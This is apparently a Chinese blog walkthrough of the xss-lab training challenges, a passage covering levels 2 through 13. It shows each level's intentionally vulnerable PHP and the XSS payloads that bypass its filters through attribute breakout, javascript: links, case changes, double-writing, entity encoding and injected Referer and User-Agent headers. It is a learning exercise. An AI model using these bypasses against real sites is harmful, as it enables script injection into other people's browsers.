html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;完成的不错！&quot;);<br> window.location.href=&quot;level3.php?writing=wait&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level2&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;<br>&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;<br>&lt;form action=level2.php method=GET&gt;<br>&lt;input name=keyword  value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;<br>&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payload的长度:25&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>两处html标签直接用到了参数内容，但有一处被转义了</p><p>只能借用&lt;input&gt;标签<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></p><h4 id="xss-lablevel3php"><a class="markdownIt-Anchor" href="#xss-lablevel3php"></a> xss-lab/level3.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level3&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&quot;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level3.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&#x27;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p><code>htmlspecialchars($str)</code>对参数进行了html转义，所以不能含有&lt;&gt;</p><p>可以使用onfocus配合javascript 伪协议来执行javascript 代码<code>onfocus=javascript:alert()</code>,之后要点击一些文本框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;onfocus=javascript:alert() &#x27;<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> &#x27;&#x27;&gt;</span><br></code></pre></td></tr></table></figure><p>使用onmouseover='alert()'来构成xss，鼠标要移动到文本框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&#x27;alert()&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel4php"><a class="markdownIt-Anchor" href="#xss-lablevel4php"></a> xss-lab/level4.php</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;onfocus=javascript:alert() &quot;<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span><span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> &quot;&quot;&gt;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel5php"><a class="markdownIt-Anchor" href="#xss-lablevel5php"></a> xss-lab/level5.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br></code></pre></td></tr></table></figure><p>script,on都被过滤，借助href</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>hhh<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&quot;<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>hhh<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&quot;&quot;&gt;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel6php"><a class="markdownIt-Anchor" href="#xss-lablevel6php"></a> xss-lab/level6.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br></code></pre></td></tr></table></figure><p>没有转小写，可以大写绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;Onfocus=javascript:alert() <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span><span class="hljs-attr">Onfocus</span>=<span class="hljs-string">javascript:alert()</span> &quot;&gt;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel7php"><a class="markdownIt-Anchor" href="#xss-lablevel7php"></a> xss-lab/level7.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> =<span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">双写绕过<br>&quot;Oonnfocus=javascript:alert() <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span><span class="hljs-attr">onfocus</span>=<span class="hljs-string">java:alert()</span> &quot;&gt;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel8php"><a class="markdownIt-Anchor" href="#xss-lablevel8php"></a> xss-lab/level8.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level8.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">编码绕过<br>href有属性自动Unicode解码,如果注入点再href中，可以进行unicode编码<br>将javascript:alert()进行unicode编码：<span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel9php"><a class="markdownIt-Anchor" href="#xss-lablevel9php"></a> xss-lab/level9.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">必须含有http:<span class="hljs-comment">//， 还要编码绕过</span><br>&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;<span class="hljs-string">&#x27;http://&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel10php"><a class="markdownIt-Anchor" href="#xss-lablevel10php"></a> xss-lab/level10.php</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">ini_set(&quot;display_errors&quot;, 0);<br>$str = $_GET[&quot;keyword&quot;];<br>$str11 = $_GET[&quot;t_sort&quot;];<br>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);<br>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);<br>echo &quot;<span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>&quot;.&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x27;.$str33.&#x27;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">过滤了 &lt;  &gt;  ,keyword被html转义，结果还被隐藏<br>源码可以看到t_sort有XSS漏洞<br>t_sort=<span class="hljs-string">&quot;onfocus=javascript:alert() type=&quot;</span><span class="hljs-built_in">text</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel11php"><a class="markdownIt-Anchor" href="#xss-lablevel11php"></a> xss-lab/level11.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>注入点在referer,可以通过bp抓包修改</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">Referer:&quot;onfocus=javascript:alert() type=&quot;text&quot;&quot;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel12php"><a class="markdownIt-Anchor" href="#xss-lablevel12php"></a> xss-lab/level12.php</h4><p>查看源码，发现注入点在user-agent，通过bp抓包修改</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">User-Agent:&quot;onfocus=javascript:alert() type=&quot;text&quot;&quot;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel13php"><a class="markdownIt-Anchor" href="#xss-lablevel13php"></a> xss-lab/level13.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_COOKIE</span>[<span 